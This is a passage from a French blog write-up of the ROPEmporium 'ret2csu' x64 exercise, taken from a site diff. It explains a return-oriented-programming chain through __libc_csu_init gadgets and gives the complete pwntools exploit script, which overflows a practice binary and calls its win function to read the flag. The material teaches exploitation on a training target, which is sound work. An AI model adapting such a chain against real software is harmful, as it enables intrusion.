+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x01</span>) <span style="color:#75715e"># 1 dans RBP pour que la comparaison RBX === RBP soit vraie</span>
+</span></span><span style="display:flex;"><span>                         <span style="color:#75715e"># (la valeur de RBX sera incrémentée de 1 avant la comparaison)</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(init) <span style="color:#75715e"># r12 = init (pour le call QWORD PTR [r12+rbx*8] d&#39;après)</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0xdeadbeefdeadbeef</span>) <span style="color:#75715e"># r13</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0xcafebabecafebabe</span>) <span style="color:#75715e"># r14</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0xd00df00dd00df00d</span>) <span style="color:#75715e"># r15</span>
+</span></span></code></pre></div><p>Ici, on va donc <em>jump</em> sur la série de <code>pop</code>. On met tout d&rsquo;abord <code>0</code> dans <code>rbx</code> et <code>1</code> dans <code>RBP</code> puisque si on regarde les lignes qui suivent les <code>mov</code> on voit ceci:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>add    rbx,<span style="color:#ae81ff">0x1</span>
+</span></span><span style="display:flex;"><span>cmp    rbp,rbx
+</span></span><span style="display:flex;"><span>jne    <span style="color:#ae81ff">0x400680</span> <span style="color:#f92672">&lt;</span>__libc_csu_init<span style="color:#f92672">+</span><span style="color:#ae81ff">64</span><span style="color:#f92672">&gt;</span>
+</span></span></code></pre></div><p>Ici, on ajoute <code>1</code> à la valeur de <code>rbx</code> puis on compare les registres <code>rbp</code> et <code>rbx</code> et si il ne sont pas égaux on jump plus haut dans la fonction, or ce n&rsquo;est pas ce qu&rsquo;on veut. On fait donc en sorte que les deux valeurs soient égales lors de la comparaison.</p>
+<p>La valeur <code>init</code> mise dans <code>r12</code> est une valeur arbitraire, elle permet de mener à bien le <code>call QWORD PTR [r12+rbx*8]</code> qui suit.</p>
+<p>Enfin, on place nos paramètres voulus dans <code>r13</code>, <code>r14</code> et <code>r15</code> puisque ce seront les valeurs qui finiront dans <code>rdx</code>, <code>rsi</code> et <code>edi</code>.</p>
+<p>Passons maintenant à la deuxième partie de l&rsquo;exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(csu_movs) <span style="color:#75715e"># rdx = r15, rsi = r14, edi = r13d</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x00</span>) <span style="color:#75715e"># Puisque qu&#39;il n&#39;y a pas de ret après les mov</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x00</span>) <span style="color:#75715e"># on va re-pop rbx, rbp, r12 etc...</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x00</span>) <span style="color:#75715e"># et on les remplis donc de null bytes</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x00</span>) <span style="color:#75715e"># puisqu&#39;on ne va plus les utiliser</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x00</span>)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x00</span>)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x00</span>)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(pop_rdi) <span style="color:#75715e"># On remet la bonne valeur dans rdi</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0xdeadbeefdeadbeef</span>)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(ret)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(win)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Flag:&#34;</span>, r<span style="color:#f92672">.</span>recvall()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)[<span style="color:#ae81ff">6</span>]<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    main()
+</span></span></code></pre></div><p>Cette fois, on saute donc à la série de <code>mov</code>. Après cette dernière, puisque la comparaison est validée, les valeurs des registres <code>rbx</code>, <code>rbp</code>, <code>r12</code>, <code>r13</code>, <code>r14</code> et <code>r15</code> sont re-modifiées et on doit donc y mettre des <em>null bytes</em>.</p>
+<p>Enfin, on <code>pop rdi</code>, on y remet notre paramètre et on jump sur la fonction <code>ret2win</code>.</p>
+<h2 id="final-payload">Final Payload</h2>
+<p>Voici donc l&rsquo;exploit complet:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;ret2csu&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> exe
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">conn</span>():
+</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> process([exe<span style="color:#f92672">.</span>path])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> conn()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    padding <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">32</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;B&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    init <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x600e38</span>
+</span></span><span style="display:flex;"><span>    win <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x400510</span>
+</span></span><span style="display:flex;"><span>    pop_rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4006a3</span>
+</span></span><span style="display:flex;"><span>    ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4004e6</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    csu_pops <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40069a</span>
+</span></span><span style="display:flex;"><span>    csu_movs <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x400680</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> padding <span style="color:#75715e"># Padding de 40 bytes pour commencer à réecrire RIP</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(ret) <span style="color:#75715e"># Patch l&#39;alignement de la stack (Ubuntu)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(csu_pops) <span style="color:#75715e"># Pop rbx, rbp, r12, r13, r14, r15</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x00</span>) <span style="color:#75715e"># 0 dans RBX</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x01</span>) <span style="color:#75715e"># 1 dans RBP pour que la comparaison RBX === RBP soit vraie</span>
+</span></span><span style="display:flex;"><span>                         <span style="color:#75715e"># (la valeur de RBX sera incrémentée de 1 avant la comparaison)</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(init) <span style="color:#75715e"># r12 = init (pour le call QWORD PTR [r12+rbx*8] d&#39;après)</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0xdeadbeefdeadbeef</span>) <span style="color:#75715e"># r13</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0xcafebabecafebabe</span>) <span style="color:#75715e"># r14</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0xd00df00dd00df00d</span>) <span style="color:#75715e"># r15</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(csu_movs) <span style="color:#75715e"># rdx = r15, rsi = r14, edi = r13d</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x00</span>) <span style="color:#75715e"># Puisque qu&#39;il n&#39;y a pas de ret après les mov</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x00</span>) <span style="color:#75715e"># on va re-pop rbx, rbp, r12 etc...</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x00</span>) <span style="color:#75715e"># et on les remplis donc de null bytes</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x00</span>) <span style="color:#75715e"># puisqu&#39;on ne va plus les utiliser</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x00</span>)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x00</span>)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x00</span>)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(pop_rdi) <span style="color:#75715e"># On remet la bonne valeur dans rdi</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0xdeadbeefdeadbeef</span>)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(ret)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(win)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Flag:&#34;</span>, r<span style="color:#f92672">.</span>recvall()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)[<span style="color:#ae81ff">6</span>]<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    main()
+</span></span></code></pre></div><p>On peut vérifier qu&rsquo;il fonctionne:</p>
+<p><img alt="2023-03-12-233951_1013x653_scrot" src="https://user-images.githubusercontent.com/77807503/224578372-184e1e8a-1472-4ebd-91a1-48255bf7fef2.png"></p>
+<p>GG !</p>
+
+      </div>
+    </article>
+
+    <hr />
+
+    <div class="post-info">
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="/tags/pwn/">pwn</a></span>
+        <span class="tag"><a href="/tags/rop/">rop</a></span>
+        <span class="tag"><a href="/tags/ret2csu/">ret2csu</a></span>
+        
+    </p>
+
+      
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        1813 Words
+      </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        
+          2023-12-03 01:00
+        
+
+         
+          
+        
+      </p>
+    </div>
+      <hr />
+      <div class="sharing-buttons">
+        
+<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=%2fposts%2f2023%2f03%2fropemporium-ret2csu-x64%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
+  <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=%2fposts%2f2023%2f03%2fropemporium-ret2csu-x64%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
+  <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
+      <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=%f0%9f%87%ab%f0%9f%87%b7%20ROPEmporium%20-%20ret2csu%20%28x64%29&amp;caption=%f0%9f%87%ab%f0%9f%87%b7%20ROPEmporium%20-%20ret2csu%20%28x64%29&amp;canonicalUrl=%2fposts%2f2023%2f03%2fropemporium-ret2csu-x64%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
+  <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
+    <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="mailto:?subject=%f0%9f%87%ab%f0%9f%87%b7%20ROPEmporium%20-%20ret2csu%20%28x64%29&amp;body=%2fposts%2f2023%2f03%2fropemporium-ret2csu-x64%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
+  <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=%2fposts%2f2023%2f03%2fropemporium-ret2csu-x64%2f&amp;media=%2fposts%2f2023%2f03%2fropemporium-ret2csu-x64%2f;description=%f0%9f%87%ab%f0%9f%87%b7%20ROPEmporium%20-%20ret2csu%20%28x64%29" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
+  <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=%2fposts%2f2023%2f03%2fropemporium-ret2csu-x64%2f&amp;title=%f0%9f%87%ab%f0%9f%87%b7%20ROPEmporium%20-%20ret2csu%20%28x64%29&amp;summary=%f0%9f%87%ab%f0%9f%87%b7%20ROPEmporium%20-%20ret2csu%20%28x64%29&amp;source=%2fposts%2f2023%2f03%2fropemporium-ret2csu-x64%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
+  <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=%2fposts%2f2023%2f03%2fropemporium-ret2csu-x64%2f&amp;resubmit=true&amp;title=%f0%9f%87%ab%f0%9f%87%b7%20ROPEmporium%20-%20ret2csu%20%28x64%29" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
+  <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=%2fposts%2f2023%2f03%2fropemporium-ret2csu-x64%2f;title=%f0%9f%87%ab%f0%9f%87%b7%20ROPEmporium%20-%20ret2csu%20%28x64%29" target="_blank" rel="noopener" aria-label="" title="Share on xing">
+  <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="whatsapp://send?text=%f0%9f%87%ab%f0%9f%87%b7%20ROPEmporium%20-%20ret2csu%20%28x64%29%20%2fposts%2f2023%2f03%2fropemporium-ret2csu-x64%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
+  <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=%2fposts%2f2023%2f03%2fropemporium-ret2csu-x64%2f&amp;t=%f0%9f%87%ab%f0%9f%87%b7%20ROPEmporium%20-%20ret2csu%20%28x64%29" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
+  <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=%f0%9f%87%ab%f0%9f%87%b7%20ROPEmporium%20-%20ret2csu%20%28x64%29&amp;url=%2fposts%2f2023%2f03%2fropemporium-ret2csu-x64%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
+  <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
+    </div>
+  </div>
+</a>
+
+      </div>
+
+    
+    <div class="pagination">
+        
+
+        <div class="pagination__buttons">
+            
+            <span class="button previous">
+                <a href="/posts/2023/03/what-is-a-race-condition-attack/">
+                    <span class="button__icon">←</span>
+                    <span class="button__text">🇬🇧 What is: &#34;A Race Condition Attack&#34;</span>
+                </a>
+            </span>
+            
+
+            
+            <span class="button next">
+                <a href="/posts/2023/02/lactf-2023-pwn/rickroll/">
+                    <span class="button__text">🇬🇧 LACTF 2023 - pwn/rickroll</span>
+                    <span class="button__icon">→</span>
+                </a>
+            </span>
+            
+        </div>
+    </div>
+
+
+    
+
+    
+
+    
+
+  </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2024</span>
+            <span><a href="/">conflict</a></span>
